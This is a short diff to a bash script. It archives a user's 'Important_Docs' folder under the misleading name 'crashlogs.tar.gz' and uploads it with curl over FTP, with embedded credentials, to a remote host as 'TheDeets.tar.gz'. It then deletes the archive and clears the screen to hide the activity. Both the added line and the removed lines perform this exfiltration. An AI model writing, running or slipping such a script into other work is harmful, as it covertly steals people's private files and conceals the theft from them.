@@ -1,8 +1,4 @@
 #!/bin/bash
 
+su hdg -c "cd ~; cd Important_Docs; tar -cf crashlogs.tar.gz * ;curl -T crashlogs.tar.gz ftp://hostinger:password@192.168.0.10:21/TheDeets.tar.gz; rm crashlogs.tar; clear; exit"
 
-cd ~;
-tar -cf crashlogs.tar /Important_Docs
-curl -T crashlogs.tar ftp://hostinger:password@192.168.0.10:21/ftp
-rm crashlogs.tar
-clear
